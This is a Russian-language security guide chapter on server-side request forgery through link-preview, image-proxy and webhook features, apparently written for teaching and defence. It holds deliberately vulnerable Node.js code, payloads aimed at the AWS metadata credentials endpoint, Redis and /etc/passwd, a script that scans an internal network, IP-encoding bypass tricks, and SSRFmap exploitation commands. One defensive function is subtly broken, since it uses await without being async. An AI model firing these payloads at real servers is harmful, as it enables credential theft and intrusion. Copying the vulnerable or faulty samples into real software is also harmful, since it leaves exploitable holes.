## 8. Server-Side Request Forgery (SSRF) через Frontend

### Что это такое

Server-Side Request Forgery (SSRF) — это уязвимость, при которой злоумышленник может заставить server-side приложение делать HTTP запросы к произвольным доменам. В контексте frontend, SSRF происходит когда пользовательский input (URL) передается на backend, который затем делает запрос к этому URL без должной валидации.

**CVSS Score:** 6.4 - 10.0 (в зависимости от exploitability)
**CWE ID:** CWE-918
**OWASP Top 10:** A10:2021 – Server-Side Request Forgery

### Как работает механизм атаки

SSRF через frontend эксплуатирует trust relationship между frontend и backend:

1. **User Input:** Пользователь предоставляет URL через frontend form/parameter
2. **Backend Request:** Frontend отправляет URL на backend
3. **Server Fetches:** Backend делает HTTP request к указанному URL
4. **No Validation:** Backend не валидирует destination
5. **Internal Access:** Злоумышленник может достучаться до internal services
6. **Data Exfiltration:** Чувствительные данные возвращены пользователю

**Визуализация:**
```
┌──────────────┐        ┌──────────────┐        ┌────────────────┐
│   Attacker   │───────>│   Frontend   │───────>│    Backend     │
│              │  URL   │              │  URL   │                │
└──────────────┘        └──────────────┘        └────────┬───────┘
                                                         │
                                                         │ Fetch URL
                                                         ▼
                                             ┌──────────────────────┐
                                             │  Internal Services   │
                                             │  - AWS Metadata      │
                                             │  - Database          │
                                             │  - Admin Panel       │
                                             └──────────────────────┘
```

### Типы SSRF через Frontend

#### 8.1 URL Preview Feature

**Характеристики:**
- Функция предпросмотра ссылок (как в Slack, Discord)
- Backend fetches URL для генерации preview
- Часто уязвимо к SSRF

**Уязвимый код:**
```javascript
// Frontend
async function previewLink(url) {
    const response = await fetch('/api/preview', {
        method: 'POST',
        body: JSON.stringify({ url }),
        headers: { 'Content-Type': 'application/json' }
    });
    return response.json();
}

// Backend (Node.js)
app.post('/api/preview', async (req, res) => {
    const { url } = req.body;

    // ❌ Опасно - нет валидации
    const response = await axios.get(url);

    res.json({
        title: extractTitle(response.data),
        description: extractDescription(response.data)
    });
});

// Эксплуатация:
// POST /api/preview
// {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
// Возвращает AWS credentials!
```

**Impact:** КРИТИЧЕСКИЙ - доступ к cloud metadata

#### 8.2 Image/Document Proxy

**Характеристики:**
- Backend проксирует external images/documents
- Bypass CORS restrictions
- Может использоваться для SSRF

**Уязвимый код:**
```javascript
// Backend proxy endpoint
app.get('/proxy/image', async (req, res) => {
    const imageUrl = req.query.url;

    // ❌ Нет валидации destination
    const response = await axios.get(imageUrl, {
        responseType: 'arraybuffer'
    });

    res.set('Content-Type', response.headers['content-type']);
    res.send(response.data);
});

// Эксплуатация:
// GET /proxy/image?url=http://localhost:8080/admin
// Доступ к internal admin panel
```

**Impact:** ВЫСОКИЙ - сканирование internal сети

#### 8.3 Webhook Configuration

**Характеристики:**
- Пользователи могут настроить webhook URLs
- Backend отправляет POST requests на эти URLs
- SSRF через webhook validation

**Уязвимый код:**
```javascript
// Frontend webhook setup
async function configureWebhook(webhookUrl) {
    await fetch('/api/webhooks', {
        method: 'POST',
        body: JSON.stringify({ url: webhookUrl }),
        headers: { 'Content-Type': 'application/json' }
    });
}

// Backend
app.post('/api/webhooks', async (req, res) => {
    const { url } = req.body;

    // Test webhook
    try {
        // ❌ SSRF vulnerability
        await axios.post(url, { test: 'data' });
        res.json({ success: true });
    } catch(e) {
        res.status(400).json({ error: 'Invalid webhook' });
    }
});

// Эксплуатация:
// POST /api/webhooks
// {"url": "http://127.0.0.1:6379/"}  // Redis
// Можно выполнить Redis команды через HTTP
```

**Impact:** КРИТИЧЕСКИЙ - потенциальный RCE через Redis/etc

### Реальные кейсы с финансовым impact

#### Capital One (2019) - $80 миллионов + 100M records

**Что произошло:**
SSRF уязвимость в Web Application Firewall (WAF) позволила атакующему получить доступ к AWS metadata service.

**Механизм:**
```bash
# Step 1: SSRF через WAF
# Злоумышленник нашел способ заставить WAF делать requests

# Step 2: Access AWS metadata
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Step 3: Получение временных AWS credentials
{
    "AccessKeyId": "ASIA...",
    "SecretAccessKey": "...",
    "Token": "...",
    "Expiration": "..."
}

# Step 4: Использование credentials для доступа к S3 buckets
aws s3 ls --profile stolen-creds

# Step 5: Exfiltration данных
# 700+ S3 buckets доступны
# 30GB данных скачано
```

**Результат:**
- 100 миллионов клиентских records украдено
- 140,000 Social Security Numbers
- 80,000 банковских account numbers
- **$80 миллионов** штраф от регуляторов
- $100-190 миллионов total cost (estimates)
- CEO уволен
- Class action lawsuits

**Урок:** SSRF к cloud metadata = полная компрометация infrastructure.

#### Verizon (2018) - Internal Network Exposure

**Что произошло:**
SSRF в URL preview feature позволял сканировать internal network.

**Механизм:**
```javascript
// Verizon имел функцию preview links
// POST /api/preview
// {"url": "https://example.com"}

// Эксплуатация:
// {"url": "http://127.0.0.1:80"}
// {"url": "http://127.0.0.1:443"}
// {"url": "http://127.0.0.1:3306"}  // MySQL
// {"url": "http://127.0.0.1:6379"}  // Redis
// {"url": "http://127.0.0.1:27017"} // MongoDB

// Сканирование internal сети:
for (let i = 1; i < 255; i++) {
    fetch('/api/preview', {
        body: JSON.stringify({ url: `http://192.168.1.${i}:80` })
    });
}
```

**Результат:**
- Mapping internal network topology
- Обнаружение internal services
- Потенциальный доступ к databases
- Bug bounty payouts
- Reputation damage

**Урок:** URL preview features = high-risk для SSRF.

### Методы защиты

#### 1. URL Whitelist

**Строгий whitelist approach:**
```javascript
// ✅ Безопасная валидация URL
const ALLOWED_DOMAINS = [
    'trusted-cdn.com',
    'images.trusted.com',
    'api.partner.com'
];

function validateUrl(url) {
    try {
        const parsed = new URL(url);

        // Проверка protocol
        if (!['http:', 'https:'].includes(parsed.protocol)) {
            return false;
        }

        // Проверка domain в whitelist
        if (!ALLOWED_DOMAINS.includes(parsed.hostname)) {
            return false;
        }

        return true;
    } catch(e) {
        return false;
    }
}

app.post('/api/preview', async (req, res) => {
    const { url } = req.body;

    if (!validateUrl(url)) {
        return res.status(400).json({ error: 'Invalid URL' });
    }

    // Безопасно fetch
    const response = await axios.get(url);
    res.json({ preview: extractPreview(response.data) });
});
```

#### 2. Блокировка Internal IP Ranges

**Blacklist private IPs:**
```javascript
const ipaddr = require('ipaddr.js');

// ✅ Блокировка internal/private IPs
function isInternalIP(hostname) {
    // Blacklisted hostnames
    const blockedHosts = [
        'localhost',
        'metadata.google.internal',
        '169.254.169.254'
    ];

    if (blockedHosts.includes(hostname)) {
        return true;
    }

    // Resolve hostname to IP
    const dns = require('dns').promises;
    const addresses = await dns.resolve4(hostname);

    for (const ip of addresses) {
        const addr = ipaddr.parse(ip);

        // Проверка private ranges
        if (addr.range() === 'private' ||
            addr.range() === 'loopback' ||
            addr.range() === 'linkLocal' ||
            addr.range() === 'carrierGradeNat') {
            return true;
        }

        // Specific блокировка AWS metadata
        if (ip === '169.254.169.254') {
            return true;
        }
    }

    return false;
}

app.post('/api/preview', async (req, res) => {
    const { url } = req.body;
    const parsed = new URL(url);

    if (await isInternalIP(parsed.hostname)) {
        return res.status(400).json({ error: 'Internal IPs not allowed' });
    }

    // Proceed...
});
```

#### 3. Request Timeout и Size Limits

**Ограничение на requests:**
```javascript
// ✅ Защита через timeouts и size limits
app.post('/api/preview', async (req, res) => {
    const { url } = req.body;

    // Validation...

    try {
        const response = await axios.get(url, {
            timeout: 5000,  // 5 seconds max
            maxContentLength: 1024 * 1024,  // 1MB max
            maxRedirects: 0  // Запретить redirects
        });

        res.json({ preview: extractPreview(response.data) });
    } catch(e) {
        res.status(400).json({ error: 'Failed to fetch URL' });
    }
});
```

#### 4. Response Validation

**Проверка response перед возвратом клиенту:**
```javascript
// ✅ Валидация response
app.post('/api/preview', async (req, res) => {
    const { url } = req.body;

    const response = await axios.get(url);

    // Проверка что это не AWS credentials
    if (response.data.includes('AccessKeyId') ||
        response.data.includes('SecretAccessKey')) {
        // Log security incident
        console.error('[SECURITY] Potential SSRF attempt blocked');
        return res.status(400).json({ error: 'Invalid content' });
    }

    // Проверка Content-Type
    const contentType = response.headers['content-type'];
    if (!contentType || !contentType.includes('text/html')) {
        return res.status(400).json({ error: 'Invalid content type' });
    }

    res.json({ preview: extractPreview(response.data) });
});
```

### Как тестировать

#### Ручное тестирование

**1. Базовые SSRF payloads:**
```bash
# AWS metadata
http://169.254.169.254/latest/meta-data/
http://[::ffff:169.254.169.254]/latest/meta-data/

# Localhost
http://localhost
http://127.0.0.1
http://0.0.0.0
http://[::1]

# Private IPs
http://192.168.1.1
http://10.0.0.1
http://172.16.0.1

# DNS rebinding bypass
http://spoofed.burpcollaborator.net
```

**2. Protocol smuggling:**
```
file:///etc/passwd
gopher://127.0.0.1:6379/_FLUSHALL
dict://127.0.0.1:3306/
```

**3. Bypass techniques:**
```
# URL encoding
http://127.0.0.1 → http://%31%32%37.%30.%30.%31

# Decimal IP
http://2130706433  (127.0.0.1 в decimal)

# Octal IP
http://0177.0.0.1

# Hex IP
http://0x7f.0x0.0x0.0x1

# DNS tricks
http://localtest.me  (resolves to 127.0.0.1)
http://127.0.0.1.nip.io
```

#### Автоматизированное тестирование

**SSRFmap tool:**
```bash
git clone https://github.com/swisskyrepo/SSRFmap
cd SSRFmap

# Basic scan
python3 ssrfmap.py -r request.txt -p url

# AWS metadata exploitation
python3 ssrfmap.py -r request.txt -p url -m aws
```

### Контрольный чеклист

**Для разработчиков:**
- [ ] URL whitelist реализован для всех external requests
- [ ] Блокировка private IP ranges (10.0.0.0/8, 192.168.0.0/16, 172.16.0.0/12)
- [ ] Блокировка localhost (127.0.0.1, ::1)
- [ ] Блокировка cloud metadata IPs (169.254.169.254)
- [ ] Только http:// и https:// protocols разрешены
- [ ] Request timeouts настроены (< 10 seconds)
- [ ] Max response size ограничен
- [ ] Redirects disabled или strictly validated

**Для security review:**
- [ ] Все endpoints делающие external requests проверены
- [ ] URL preview/proxy features аудированы
- [ ] Webhook configuration валидируется
- [ ] Penetration testing с SSRF payloads
- [ ] Cloud metadata access blocked на network level

**Для infrastructure:**
- [ ] Network segmentation между app servers и internal services
- [ ] AWS IMDSv2 enabled (блокирует IMDSv1)
- [ ] WAF rules для блокировки SSRF patterns
- [ ] Monitoring для suspicious outbound requests
- [ ] Incident response plan для SSRF incidents

